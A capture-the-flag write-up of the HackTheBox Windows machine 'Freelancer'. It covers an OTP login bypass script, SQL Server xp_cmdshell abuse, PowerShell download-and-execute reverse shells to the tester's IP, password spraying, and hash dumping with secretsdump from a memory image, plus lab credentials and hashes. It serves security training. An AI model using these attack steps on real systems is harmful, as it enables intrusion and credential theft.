---
title: HackTheBox - Freelancer
date: Fri Aug 16 01:12:30 AM EDT 2024
categories: [PentestNotes]
tags: [windows,dns,dc,bloodhound,qr,auth_bypass,django,sqli,rce,mssql,forensics,htb,htb_season_5]
---

## Recon

{::options parse_block_html="true" /}

<details>

<summary markdown="span">nmap_scan.log</summary>

```log
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com

[~] The config file is expected to be at "/home/rustscan/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.10.11.5:53
Open 10.10.11.5:88
Open 10.10.11.5:80
Open 10.10.11.5:135
Open 10.10.11.5:139
Open 10.10.11.5:389
Open 10.10.11.5:445
Open 10.10.11.5:464
Open 10.10.11.5:593
Open 10.10.11.5:636
Open 10.10.11.5:3268
Open 10.10.11.5:3269
Open 10.10.11.5:5985
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -vvv -sV -sC -Pn" on ip 10.10.11.5
Depending on the complexity of the script, results may take some time to appear.
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2024-06-16 06:59 UTC
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 06:59
Completed NSE at 06:59, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 06:59
Completed NSE at 06:59, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 06:59
Completed NSE at 06:59, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 06:59
Completed Parallel DNS resolution of 1 host. at 06:59, 0.00s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 06:59
Scanning 10.10.11.5 [13 ports]
Discovered open port 3268/tcp on 10.10.11.5
Discovered open port 5985/tcp on 10.10.11.5
Discovered open port 445/tcp on 10.10.11.5
Discovered open port 464/tcp on 10.10.11.5
Discovered open port 636/tcp on 10.10.11.5
Discovered open port 3269/tcp on 10.10.11.5
Discovered open port 53/tcp on 10.10.11.5
Discovered open port 80/tcp on 10.10.11.5
Discovered open port 135/tcp on 10.10.11.5
Discovered open port 139/tcp on 10.10.11.5
Discovered open port 389/tcp on 10.10.11.5
Discovered open port 593/tcp on 10.10.11.5
Discovered open port 88/tcp on 10.10.11.5
Completed Connect Scan at 06:59, 2.34s elapsed (13 total ports)
Initiating Service scan at 06:59
Scanning 13 services on 10.10.11.5
Completed Service scan at 06:59, 19.08s elapsed (13 services on 1 host)
NSE: Script scanning 10.10.11.5.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 06:59
Completed NSE at 06:59, 9.37s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 06:59
Completed NSE at 06:59, 3.19s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 06:59
Completed NSE at 06:59, 0.00s elapsed
Nmap scan report for 10.10.11.5
Host is up, received user-set (0.15s latency).
Scanned at 2024-06-16 06:59:07 UTC for 35s

PORT     STATE SERVICE       REASON  VERSION
53/tcp   open  domain        syn-ack Simple DNS Plus
80/tcp   open  http          syn-ack nginx 1.25.5
|_http-title: Did not follow redirect to http://freelancer.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.25.5
88/tcp   open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2024-06-16 11:59:16Z)
135/tcp  open  msrpc         syn-ack Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: freelancer.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds? syn-ack
464/tcp  open  kpasswd5?     syn-ack
593/tcp  open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped    syn-ack
3268/tcp open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: freelancer.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped    syn-ack
5985/tcp open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-06-16T11:59:33
|_  start_date: N/A
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 16160/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 53827/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 55524/udp): CLEAN (Failed to receive data)
|   Check 4 (port 43748/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: 4h59m58s

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 06:59
Completed NSE at 06:59, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 06:59
Completed NSE at 06:59, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 06:59
Completed NSE at 06:59, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 37.50 seconds
```
</details>

{::options parse_block_html="false" /}

```bash
└─$ cat /etc/hosts | grep free
10.10.11.5      freelancer.htb  dc.freelancer.htb       hostmaster.freelancer.htb
```

## DNS (53)

DNS enumeration gives new subdomains. Update hosts.

```bash
└─$ dig ANY freelancer.htb @10.10.11.5
; <<>> DiG 9.19.21-1-Debian <<>> ANY freelancer.htb @10.10.11.5
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 57746
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 3, AUTHORITY: 0, ADDITIONAL: 2

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;freelancer.htb.                        IN      ANY

;; ANSWER SECTION:
freelancer.htb.         600     IN      A       10.10.11.5
freelancer.htb.         3600    IN      NS      dc.freelancer.htb.
freelancer.htb.         3600    IN      SOA     dc.freelancer.htb. hostmaster.freelancer.htb. 534 900 600 86400 3600

;; ADDITIONAL SECTION:
dc.freelancer.htb.      3600    IN      A       10.10.11.5

;; Query time: 135 msec
;; SERVER: 10.10.11.5#53(10.10.11.5) (TCP)
;; WHEN: Sun Jun 16 03:03:33 EDT 2024
;; MSG SIZE  rcvd: 139
```

## HTTP (80)

![Writeup.png](/assets/images/Season 5/Freelancer/Writeup.png)

### Normal User

We are allowed to register as a Freelancer or Employer.

Employer has a note so it's worth exploring this first.

![Writeup-1.png](/assets/images/Season 5/Freelancer/Writeup-1.png)

> Creds: `test02:test02@freelancer.htb:test02test02`
{: .prompt-tip }

Since our account had to be reviewed I tried XSS payload, but no luck.

On login page we have option to recover the password. After answering questions we end up on Reset Password, but the URL is a bit funky.

![Writeup-2.png](/assets/images/Season 5/Freelancer/Writeup-2.png)

We aren't able to reset password of others, the application gives 500. Probably our id is tied to sessionid which we can't effect. The password reset activated our account and we are able to login.

![Writeup-3.png](/assets/images/Season 5/Freelancer/Writeup-3.png)

### OTP Authentication

QR Code is interesting

![Writeup-4.png](/assets/images/Season 5/Freelancer/Writeup-4.png)

The same funky url is used for Authentication.

![Writeup-5.png](/assets/images/Season 5/Freelancer/Writeup-5.png)

> Tool: [https://qrcode-decoder.com](https://qrcode-decoder.com)
{: .prompt-info }

Fuzz the parameter. QR link is one time use only so it needs to be generated for each login attempt.

```python
from io import BytesIO
import requests
from base64 import b64encode
from pyzbar.pyzbar import decode
from PIL import Image

def get_auth_token():
    resp = requests.get(Routes.GENERATE, cookies=COOKIES)
    auth_url = decode(Image.open(BytesIO(resp.content)))[0].data.decode()
    token = auth_url.split('/')[-2]
    
    return token

class Routes:
    BASE = 'http://freelancer.htb/accounts'
    GENERATE = BASE + '/otp/qrcode/generate/'

    @staticmethod
    def LOGIN(id_, token):
        return Routes.BASE + f'/login/otp/{b64encode(str(id_).encode()).decode()}/{token}/'


COOKIES = {'csrftoken': 'XXUrCUyu8rA265jIDgGwsZwCRxjwtqoc',
           'sessionid': 'ddtmxpq9ny4jcxnd5dcxhhmpbrpqddqv'}

def fuzz(limit):
    for i in range(limit):
        token = get_auth_token()
        login_url = Routes.LOGIN(i, token)
        resp = requests.get(login_url)
        print(f'[{i}] {resp.text[:100]} | {login_url}')
        if 'Invalid' not in resp.text:
            return i

valid_id = fuzz(5)
token = get_auth_token()
print("\nURL: ", Routes.LOGIN(valid_id, token))

'''
└─$ py auth.py
[0] Invalid user primary key! | http://freelancer.htb/accounts/login/otp/MA==/813abb36583bd35efc8586949f809fb8/
[1] Invalid user primary key! | http://freelancer.htb/accounts/login/otp/MQ==/b024660ab9ead2e768d496bde357209d/
[2] <!doctype html>
<html lang="zxx">

<head>
    <!-- Required meta tags -->
    <meta charset="utf-8"> | http://freelancer.htb/accounts/login/otp/Mg==/8af5b89c31c2365bccdeaa73748f4f49/

URL: http://freelancer.htb/accounts/login/otp/Mg==/2cc9ecb54d408a8a2e239a1ed34da920/
'''
```

Using OTP we are able to login as admin (id=2)

### Admin Account Via OTP

![Writeup-6.png](/assets/images/Season 5/Freelancer/Writeup-6.png)

Since the app is built with Django we have `/admin` panel

![Writeup-7.png](/assets/images/Season 5/Freelancer/Writeup-7.png)

### Django Admin Panel

![Writeup-8.png](/assets/images/Season 5/Freelancer/Writeup-8.png)

Application has `SQL Terminal` we can play around

![Writeup-9.png](/assets/images/Season 5/Freelancer/Writeup-9.png)

[PayloadsAllTheThings: MSSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md)

```sql
> SELECT user; -- Get User
Freelancer_webapp_user
> SELECT HOST_NAME(); -- Get Hostname
DC
> SELECT name FROM master..sysdatabases; -- Get Databases
master
tempdb
model
msdb
Freelancer_webapp_DB
> SELECT name FROM Freelancer_webapp_DB..sysobjects WHERE xtype = 'U';
django_migrations
freelancer_customuser
freelancer_article
freelancer_job
freelancer_otptoken
freelancer_employer
freelancer_freelancer
freelancer_comment
freelancer_job_request
django_content_type
django_admin_log
auth_permission
auth_group
auth_group_permissions
django_session
> SELECT name FROM msdb..sysobjects WHERE xtype = 'U';
dm_hadr_automatic_seeding_history
backupmediaset
backupmediafamily
backupset
backupfile
restorehistory
restorefile
restorefilegroup
logmarkhistory
suspect_pages
> EXEC master.dbo.xp_cmdshell "net user";
('42000', "[42000] [Microsoft][ODBC Driver 17 for SQL Server][SQL Server]The EXECUTE permission was denied on the object 'xp_cmdshell', database 'mssqlsystemresource', schema 'sys'. (229) (SQLExecDirectW)")
```

MSSQL can execute shell commands, but looks like we don't have permissions to do so. Database didn't have anything more interesting then this. 

Get users and permissions:
```sql
SELECT 
    u.name AS user_name,
    r.name AS role_name,
    p.permission_name,
    p.state_desc AS permission_state,
    o.type_desc AS object_type,
    o.name AS object_name
FROM 
    sys.database_principals u
LEFT JOIN 
    sys.database_role_members rm ON u.principal_id = rm.member_principal_id
LEFT JOIN 
    sys.database_principals r ON rm.role_principal_id = r.principal_id
LEFT JOIN 
    sys.database_permissions p ON u.principal_id = p.grantee_principal_id
LEFT JOIN 
    sys.objects o ON p.major_id = o.object_id
WHERE 
    u.type IN ('S', 'U', 'G') -- S = SQL user, U = Windows user, G = Windows group
ORDER BY 
    u.name, o.name, p.permission_name;
```

![Writeup-10.png](/assets/images/Season 5/Freelancer/Writeup-10.png)

Get sysadmins:
```sql
SELECT 
    sp.name AS principal_name,
    sp.type_desc AS principal_type
FROM 
    sys.server_principals sp
JOIN 
    sys.server_role_members srm ON sp.principal_id = srm.member_principal_id
JOIN 
    sys.server_principals rp ON srm.role_principal_id = rp.principal_id;
```

![Writeup-11.png](/assets/images/Season 5/Freelancer/Writeup-11.png)

```sql
EXECUTE AS LOGIN = 'sa';
EXEC xp_cmdshell "net user";
REVERT;

User accounts for \\DC
null
-------------------------------------------------------------------------------
Administrator alex.hill carol.poland
d.jones dthomas ereed
Ethan.l evelyn.adams Guest
hking jen.brown jgreen
jmartinez krbtgt leon.sk
lkazanof lorra199 maya.artmes
michael.williams mikasaAckerman olivia.garcia
samuel.turner sdavis sophia.h
sql_svc SQLBackupOperator sshd
taylor wwalker
The command completed successfully.
```

I tried getting ConPtyShell, but it looks like AV Is active on box.

![Writeup-12.png](/assets/images/Season 5/Freelancer/Writeup-12.png)

Probably box specific thing, but the `xp_cmdshell` permissions restarts after few commands. To reset use:
```bash
EXECUTE AS LOGIN = 'sa'; 
EXEC sp_configure 'show advanced options',1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1;
RECONFIGURE;
```

## Reverse Shell

Reverse shells from `revshell.com` were getting caught, then I used `powercat`

```bash
└─$ powercat -c 10.10.16.75 -p 4444 -e powershell -g > rev.ps1

┌──(woyag㉿kraken)-[~/Desktop/Rooms/Freelancer]
└─$ serve
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.5 - - [16/Jun/2024 05:15:57] "GET /rev.ps1 HTTP/1.1" 200 -
---
EXECUTE AS LOGIN = 'sa'; 
EXEC xp_cmdshell 'powershell -c IEX ( IWR -UseBasicParsing http://10.10.16.75/rev.ps1 )';
REVERT;
---
└─$ listen
Ncat: Version 7.94SVN ( https://nmap.org/ncat )
Ncat: Listening on [::]:4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.11.5:53976.
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\WINDOWS\system32> whoami
freelancer\sql_svc
```

SQL database seems to be living on `sql_svc` user Downloads
```powershell
PS C:\users> tree
Folder PATH listing
Volume serial number is 8954-28AE
C:.
Administrator
lkazanof
lorra199
mikasaAckerman
MSSQLSERVER
Public
   Documents
   Downloads
   Music
   Pictures
   Videos
sqlbackupoperator
sql_svc
    3D Objects
    Contacts
    Desktop
    Documents
    Downloads
       SQLEXPR-2019_x64_ENU
           1033_ENU_LP
              x64
                  1033
                  Setup
                      x64
           redist
              VisualStudioShell
                  VCRuntimes
           resources
              1033
           x64
               Setup
    Favorites
    Links
    Music
    Pictures
    Saved Games
    Searches
    Videos
```

Database configuration:
```powershell
PS C:\users\sql_svc\Downloads\SQLEXPR-2019_x64_ENU> cat sql-Configuration.INI
cat sql-Configuration.INI
[OPTIONS]
ACTION="Install"
QUIET="True"
FEATURES=SQL
INSTANCENAME="SQLEXPRESS"
INSTANCEID="SQLEXPRESS"
RSSVCACCOUNT="NT Service\ReportServer$SQLEXPRESS"
AGTSVCACCOUNT="NT AUTHORITY\NETWORK SERVICE"
AGTSVCSTARTUPTYPE="Manual"
COMMFABRICPORT="0"
COMMFABRICNETWORKLEVEL=""0"
COMMFABRICENCRYPTION="0"
MATRIXCMBRICKCOMMPORT="0"
SQLSVCSTARTUPTYPE="Automatic"
FILESTREAMLEVEL="0"
ENABLERANU="False"
SQLCOLLATION="SQL_Latin1_General_CP1_CI_AS"
SQLSVCACCOUNT="FREELANCER\sql_svc"
SQLSVCPASSWORD="IL0v3ErenY3ager"
SQLSYSADMINACCOUNTS="FREELANCER\Administrator"
SECURITYMODE="SQL"
SAPWD="t3mp0r@ryS@PWD"
ADDCURRENTUSERASSQLADMIN="False"
TCPENABLED="1"
NPENABLED="1"
BROWSERSVCSTARTUPTYPE="Automatic"
IAcceptSQLServerLicenseTerms=True
```

List all users:
```powershell
# Credits: https://superuser.com/a/608953

$computerName = "$env:computername"
$computer = [ADSI]"WinNT://$computerName,computer" 
$computer.psbase.Children | Where-Object { $_.psbase.schemaclassname -eq 'user' } | Format-Table Name, Description -autoSize 

Name                Description
----                -----------
{Administrator}     {Built-in account for administering the computer/domain}
{alex.hill}         {DJango Developer}
{carol.poland}      {IT Technician}
{d.jones}           {Software Developer}
{dthomas}           {System Analyzer}
{ereed}             {Site Reliability Engineer (SRE)}
{Ethan.l}           {DJango Developer}
{evelyn.adams}      {Active Directory Accounts Operator}
{Guest}             {Built-in account for guest access to the computer/domain}
{hking}             {}
{jen.brown}         {Software Developer}
{jgreen}            {Active Directory Accounts Operator}
{jmartinez}         {Executive Manager}
{krbtgt}            {Key Distribution Center Service Account}
{leon.sk}           {Site Reliability Engineer (SRE)}
{lkazanof}          {System Reliability Monitor (SRM) & Account Operator}
{lorra199}          {IT Support Technician}
{maya.artmes}       {System Analyzer}
{michael.williams}  {Department Manager}
{mikasaAckerman}    {Database Developer}
{olivia.garcia}     {WSGI Manager}
{samuel.turner}     {}
{sdavis}            {IT Support}
{sophia.h}          {Datacenter Manager}
{sql_svc}           {MSSQL Database Domain Account}
{SQLBackupOperator} {SQL Backup Operator Account for Temp Schudeled SQL Express Backups}
{sshd}              {}
{taylor}            {Human Resources Specialist}
{wwalker}           {Active Directory Trusts Manager}
```

Format usernames:
```bash
Administrator
alex.hill
carol.poland
d.jones
dthomas
ereed
Ethan.l
evelyn.adams
Guest
hking
jen.brown
jgreen
jmartinez
krbtgt
leon.sk
lkazanof
lorra199
maya.artmes
michael.williams
mikasaAckerman
olivia.garcia
samuel.turner
sdavis
sophia.h
sql_svc
SQLBackupOperato
sshd
taylor
wwalker
```

Passwords:
```bash
t3mp0r@ryS@PWD
IL0v3ErenY3ager
```

Check if any user uses this passwords:
```bash
└─$ netexec smb 10.10.11.5 -u usernames.txt -p passwords.txt
SMB         10.10.11.5      445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:freelancer.htb) (signing:True) (SMBv1:False)
...
SMB         10.10.11.5      445    DC               [+] freelancer.htb\mikasaAckerman:IL0v3ErenY3ager
```

## Privilege Escalation (mikasaackerman)

`winrm` is not active system so no luck there. Get reverse shell via `RunasCs.exe`:
```powershell
PS C:\users\sql_svc\Downloads\SQLEXPR-2019_x64_ENU> cd /temp  
PS C:\temp> iwr 10.10.16.75/RunasCs.exe -Outfile rc.exe
PS C:\temp> .\rc.exe mikasaAckerman IL0v3ErenY3ager powershell -r 10.10.16.75:4444
[+] Running in session 0 with process function CreateProcessWithLogonW()
[+] Using Station\Desktop: Service-0x0-48000$\Default
[+] Async process 'C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe' with pid 4408 created in background.
---
└─$ listen
Ncat: Version 7.94SVN ( https://nmap.org/ncat )
Ncat: Listening on [::]:4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.11.5:54106.
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\WINDOWS\system32> whoami
PS C:\WINDOWS\system32> cd \users\mikasaackerman\Desktop
PS C:\users\mikasaackerman\Desktop> ls

    Directory: C:\users\mikasaackerman\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       10/28/2023   6:23 PM           1468 mail.txt
-a----        10/4/2023   1:47 PM      292692678 MEMORY.7z
-ar---        6/16/2024   5:40 AM             34 user.txt
```

## User.txt

```bash
PS C:\users\mikasaackerman\Desktop> cat user.txt
795b0d8124893776084b71bea269ab55
```

## Privilege Escalation (lorra199)

```bash
PS C:\users\mikasaackerman\Desktop> cat mail.txt
Hello Mikasa,
I tried once again to work with Liza Kazanoff after seeking her help to troubleshoot the BSOD issue on the "DATACENTER-2019" computer. As you know, the problem started occurring after we installed the new update of SQL Server 2019.
I attempted the solutions you provided in your last email, but unfortunately, there was no improvement. Whenever we try to establish a remote SQL connection to the installed instance, the server's CPU starts overheating, and the RAM usage keeps increasing until the BSOD appears, forcing the server to restart.
Nevertheless, Liza has requested me to generate a full memory dump on the Datacenter and send it to you for further assistance in troubleshooting the issue.
Best regards,
```

Download the file: (download speed isn't good)
```bash
PS C:\Users\mikasaackerman\Desktop> python -m http.server 8888
::ffff:10.10.16.75 - - [16/Jun/2024 11:03:10] "GET /MEMORY.7z HTTP/1.1" 200 -
---
└─$ curl http://freelancer.htb:8888/MEMORY.7z -O
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  279M  100  279M    0     0   412k      0  0:11:33  0:11:33 --:--:--  448k
└─$ 7z x MEMORY.7z
└─$ ls -l
Permissions Size User  Date Modified Name
.rw-r--r--  293M woyag 16 Jun 06:14   MEMORY.7z
.rw-r--r--  1.8G woyag  8 Oct  2023   MEMORY.DMP
└─$ file MEMORY.DMP
MEMORY.DMP: MS Windows 64bit crash dump, version 15.17763, 2 processors, full dump, 4992030524978970960 pages
```

### Forensics

Volatility was not particularly helpful about this dump. Through some hints I found tool [MemProcFS](https://github.com/ufrisk/MemProcFS).

```bash
┌──(woyag㉿kraken)-[~/Desktop/Rooms/Freelancer/memory]
└─$ curl -LO https://github.com/ufrisk/MemProcFS/releases/download/v5.9/MemProcFS_files_and_binaries_v5.9.18-linux_x64-20240613.tar.gz
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
100 3958k  100 3958k    0     0  1108k      0  0:00:03  0:00:03 --:--:-- 1441k

└─$ tar -xzvf MemProcFS_files_and_binaries_v5.9.18-linux_x64-20240613.tar.gz
./
./info.db
./leechcore.h
./leechcore.so
./leechcore_device_microvmi.so
./leechcore_device_qemu.so
./leechcore_device_rawtcp.so
./leechcore_driver.so
./leechcore_ft601_driver_linux.so
./libMSCompression.so
./libpdbcrust.so
./libpdbcrust2.so
./LICENSE.txt
./license_libmscompression.txt
./license_libpdbcrust.txt
./license_vmmyara.txt
./memprocfs
./memprocfs.py
./memprocfs_example.py
./memprocfs_pythonexec_example.py
./plugins/
./plugins/m_vmemd.so
./plugins/pym_pluginupdater/
./plugins/pym_pluginupdater/pym_pluginupdater.py
./plugins/pym_pluginupdater/__init__.py
./plugins/pym_procstruct/
./plugins/pym_procstruct/pym_procstruct.py
./plugins/pym_procstruct/__init__.py
./plugins/pyp_reg_root_reg$net_bth$devices.py
./plugins/pyp_reg_root_reg$net_tcpip$interfaces.py
./plugins/pyp_reg_root_reg$usb_usb$devices.py
./plugins/pyp_reg_root_reg$usb_usb$storage.py
./plugins/pyp_reg_user_reg$user_wallpaper.py
./Symbols/
./vmm.so
./vmmdll.h
./vmmpyc.so
./vmmpyplugin.py
./vmmyara.so
./vmmyara2.so
└─$ sudo ./memprocfs -device /media/sf_VBoxShare/MEMORY.DMP -mount /mnt/tmpmount
Initialized 64-bit Windows 10.0.17763
[SYMBOL]   Functionality may be limited. Extended debug information disabled.
[SYMBOL]   Partial offline fallback symbols in use.
[SYMBOL]   For additional information use startup option: -loglevel symbol:4
[SYMBOL]   Reason: Unable to download kernel symbols to cache from Symbol Server.


==============================  MemProcFS  ==============================
 - Author:           Ulf Frisk - pcileech@frizk.net
 - Info:             https://github.com/ufrisk/MemProcFS
 - Discord:          https://discord.gg/pcileech
 - License:          GNU Affero General Public License v3.0
   ---------------------------------------------------------------------
   MemProcFS is free open source software. If you find it useful please
   become a sponsor at: https://github.com/sponsors/ufrisk Thank You :)
   ---------------------------------------------------------------------
 - Version:          5.9.18 (Linux)
 - Mount Point:      /mnt/tmpmount
 - Tag:              17763_a3431de6
 - Operating System: Windows 10.0.17763 (X64)
==========================================================================
```

The process is kept running because it's live mounting the dump file, process doesn't take long. 

```bash
┌──(root㉿kraken)-[/mnt/tmpmount]
└─# ls -alh
Permissions Size User Date Modified Name
drwxr-xr-x     - root 16 Jun 07:14   conf
drwxr-xr-x     - root 16 Jun 07:14   forensic
.rw-r--r--  1.8G root 16 Jun 07:14   memory.dmp
.rw-r--r--  1.8G root 16 Jun 07:14   memory.pmem
drwxr-xr-x     - root 16 Jun 07:14   misc
drwxr-xr-x     - root 16 Jun 07:14   name
drwxr-xr-x     - root 16 Jun 07:14   pid
drwxr-xr-x     - root 16 Jun 07:14   py
drwxr-xr-x     - root 16 Jun 07:14   registry
drwxr-xr-x     - root 16 Jun 07:14   sys
┌──(root㉿kraken)-[/mnt/tmpmount/registry/hive_files]
└─# ls -l
Permissions Size User Date Modified Name
.rw-r--r--  8.2k root 16 Jun 07:14   0xffffd3067b257000-settingsdat-A_{c94cb844-4804-8507-e708-439a8873b610}.reghive
.rw-r--r--  324k root 16 Jun 07:14   0xffffd3067b261000-ActivationStoredat-A_{23F7AFEB-1A41-4BD7-9168-EA663F1D9A7D}.reghive
.rw-r--r--   29k root 16 Jun 07:14   0xffffd3067b514000-BCD-MACHINE_BCD00000000.reghive
.rw-r--r--   91M root 16 Jun 07:14   0xffffd3067b516000-SOFTWARE-MACHINE_SOFTWARE.reghive
.rw-r--r--  319k root 16 Jun 07:14   0xffffd3067d7e9000-DEFAULT-USER_.DEFAULT.reghive
.rw-r--r--   49k root 16 Jun 07:14   0xffffd3067d7f0000-SECURITY-MACHINE_SECURITY.reghive
.rw-r--r--  188k root 16 Jun 07:14   0xffffd3067d9c4000-NTUSERDAT-USER_S-1-5-20.reghive
.rw-r--r--   49k root 16 Jun 07:14   0xffffd3067d935000-SAM-MACHINE_SAM.reghive
.rw-r--r--  242k root 16 Jun 07:14   0xffffd3067db43000-BBI-A_{ae450ff4-3002-4d4d-921c-fd354d63ec8b}.reghive
.rw-r--r--  172k root 16 Jun 07:14   0xffffd3067db53000-NTUSERDAT-USER_S-1-5-19.reghive
.rw-r--r--  119k root 16 Jun 07:14   0xffffd3067dd5e000-ActivationStoredat-A_{D65833F6-A688-4A68-A28F-F59183BDFADA}.reghive
.rw-r--r--  1.2M root 16 Jun 07:14   0xffffd3067e30e000-UsrClassdat-USER_S-1-5-21-3542429192-2036945976-3483670807-1121_Classes.reghive
.rw-r--r--  1.5M root 16 Jun 07:14   0xffffd3067ec26000-Amcachehve-A_{da3518a3-bbc6-1dba-206b-2755382f1364}.reghive
.rw-r--r--  524k root 16 Jun 07:14   0xffffd3067ec39000-ntuserdat-USER_S-1-5-21-3542429192-2036945976-3483670807-1121.reghive
.rw-r--r--   45k root 16 Jun 07:14   0xffffd3067ec58000-settingsdat-A_{8a28242f-95cc-f96a-239c-d8a872afe4cc}.reghive
.rw-r--r--  3.8M root 16 Jun 07:14   0xffffd3067f097000-DRIVERS-MACHINE_DRIVERS.reghive
.rw-r--r--  643k root 16 Jun 07:14   0xffffd3067f9e7000-ntuserdat-USER_S-1-5-21-3542429192-2036945976-3483670807-500.reghive
.rw-r--r--  1.4M root 16 Jun 07:14   0xffffd3067f91b000-UsrClassdat-USER_S-1-5-21-3542429192-2036945976-3483670807-500_Classes.reghive
.rw-r--r--  8.2k root 16 Jun 07:14   0xffffd30679c0e000-unknown-unknown.reghive
.rw-r--r--   18M root 16 Jun 07:14   0xffffd30679c46000-SYSTEM-MACHINE_SYSTEM.reghive
.rw-r--r--   29k root 16 Jun 07:14   0xffffd30679cdc000-unknown-MACHINE_HARDWARE.reghive
└─# impacket-secretsdump -sam 0xffffd3067d935000-SAM-MACHINE_SAM.reghive -system 0xffffd30679c46000-SYSTEM-MACHINE_SYSTEM.reghive -security 0xffffd3067d7f0000-SECURITY-MACHINE_SECURITY.reghive local
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Target system bootKey: 0xaeb5f8f068bbe8789b87bf985e129382
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:725180474a181356e53f4fe3dffac527:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:04fc56dd3ee3165e966ed04ea791d7a7:::
[*] Dumping cached domain logon information (domain/username:hash)
FREELANCER.HTB/Administrator:$DCC2$10240#Administrator#67a0c0f193abd932b55fb8916692c361: (2023-10-04 12:55:34)
FREELANCER.HTB/lorra199:$DCC2$10240#lorra199#7ce808b78e75a5747135cf53dc6ac3b1: (2023-10-04 12:29:00)
FREELANCER.HTB/liza.kazanof:$DCC2$10240#liza.kazanof#ecd6e532224ccad2abcf2369ccb8b679: (2023-10-04 17:31:23)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC
$MACHINE.ACC:plain_password_hex:a680a4af30e045066419c6f52c073d738241fa9d1cff591b951535cff5320b109e65220c1c9e4fa891c9d1ee22e990c4766b3eb63fb3e2da67ebd19830d45c0ba4e6e6df93180c0a7449750655edd78eb848f757689a6889f3f8f7f6cf53e1196a528a7cd105a2eccefb2a17ae5aebf84902e3266bbc5db6e371627bb0828c2a364cb01119cf3d2c70d920328c814cad07f2b516143d86d0e88ef1504067815ed70e9ccb861f57394d94ba9f77198e9d76ecadf8cdb1afda48b81f81d84ac62530389cb64d412b784f0f733551a62ec0862ac2fb261b43d79990d4e2bfbf4d7d4eeb90ccd7dc9b482028c2143c5a6010
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:1003ddfa0a470017188b719e1eaae709
[*] DPAPI_SYSTEM
